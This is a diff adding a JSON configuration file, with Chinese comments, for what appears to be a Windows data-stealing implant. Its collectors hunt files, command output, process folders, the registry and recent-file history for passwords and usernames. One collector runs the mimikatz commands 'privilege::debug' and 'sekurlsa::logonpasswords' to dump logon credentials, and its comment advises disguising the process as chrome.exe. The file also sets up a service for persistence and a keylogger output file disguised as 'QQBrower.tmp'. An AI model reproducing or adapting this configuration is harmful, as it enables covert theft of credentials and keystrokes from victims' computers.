@@ -1,0 +1,102 @@
+{
+    "CollectConfigTable" : {
+        "Collectors":[
+        {
+            "ShortName":"filesWorm",
+            "OS":"Windows",
+            "Locations":[ "C:/Users/V/Desktop/vvvsss"],
+            "ContentKeys": ["\"_id\":"],
+            "NameKeys":[],
+            "SuffixTypes":[".txt"],
+            "Explain": "文件及文件夹收集,keys中的[''] ['*'] [] null 都代表全部* ",
+            "Commands":null,
+            "ProcessName": null,
+            "RE_ValueNames": null,
+            "RE_ValueDatas": null,
+            "RE_ValueTypes": null
+        },
+        {
+            "ShortName":"CommandWorm",
+            "OS":"Windows",
+            "Locations":null,
+            "ContentKeys":[ "password=", "密码","username" ],
+            "NameKeys":null,
+            "SuffixTypes":null,
+            "Explain": "根据输入的cmd命令收集输出信息...",
+            "Commands":["ipconfig"],
+            "ProcessName": null,
+            "RE_ValueNames": null,
+            "RE_ValueDatas": null,
+            "RE_ValueTypes": null
+        },
+        {
+            "ShortName":"ProcessWorm",
+            "OS":"Windows",
+            "Locations": null,
+            "ContentKeys": ["\"_id\":"],
+            "NameKeys": ["test"],
+            "SuffixTypes": [".txt",".dit","xshs",".edg"],
+            "Explain": "根据Process名称收集该进程目录下的相关信息",
+            "Commands": null,
+            "ProcessName": ["chrome.exe","padd.exe"],
+            "RE_ValueNames": null,
+            "RE_ValueDatas": null,
+            "RE_ValueTypes": null
+        },
+        {
+            "ShortName":"RegistryWorm",
+            "OS":"Windows",
+            "Locations": ["HKEY_CURRENT_USER\\Environment","HKEY_CURRENT_USER\\SOFTWARE\\Ttest"],
+            "ContentKeys": null,
+            "NameKeys": ["TestW","TestA"],
+            "SuffixTypes": null,
+            "Explain": "根据注册表信息搜寻项或值 locations:注册表的搜索范围,CotentKeys:根据项的值名称搜索,NameKeys:根据项名称搜索",
+            "Commands": null,
+            "ProcessName": ["chrome.exe","padd.exe"],
+            "RE_ValueNames":["TestWorm","WormT","TestBin","IntTest"],
+            "RE_ValueDatas":["55","C"]
+        },
+        {
+            "ShortName":"RecentWorm",
+            "OS":"Windows",
+            "Locations": null,
+            "ContentKeys": [],
+            "NameKeys":["*"],
+            "SuffixTypes":[""],
+            "Explain": "最近访问检索，仅配置contentkeys 、namekeys、SuffixTypes即可使用 ，recent的内容扫描因为内容很多，所以扫描速度非常慢，建议先扫描出文件夹名称，再进行filesworm",
+            "Commands":null,
+            "ProcessName": null,
+            "RE_ValueNames": null,
+            "RE_ValueDatas": null,
+            "RE_ValueTypes": null
+        },
+        {
+            "ShortName":"APiWorm",
+            "OS":"Windows",
+            "Locations": null,
+            "ContentKeys": null,
+            "NameKeys":null,
+            "SuffixTypes":null,
+            "Explain": "Window 凭据收集，mimikatz  Commands输入mimikatz命令开始收集信息，ProcessName为程序名称建议伪装（Chrome.exe）",
+            "Commands":["version","log","privilege::debug","sekurlsa::logonpasswords"],
+            "ProcessName": ["chrome.exe"],
+            "RE_ValueNames": null,
+            "RE_ValueDatas": null,
+            "RE_ValueTypes": null
+        }
+    ]
+    },
+    "Timeout": 60,
+    "TimeU": "min",
+    "Osskey": "str",
+    "ServiceName": "GOService",
+    "ServiceDisplayName": "GoServiceDis",
+    "ServiceDescription": "this is GoService",
+    "SaveName": "360temp.tmp",
+    "KeylogSaveloc": "C:\\Users\\V\\AppData\\Local\\Packages\\Microsoft.Messaging\\QQBrower.tmp"
+
+
+}
+
+
+
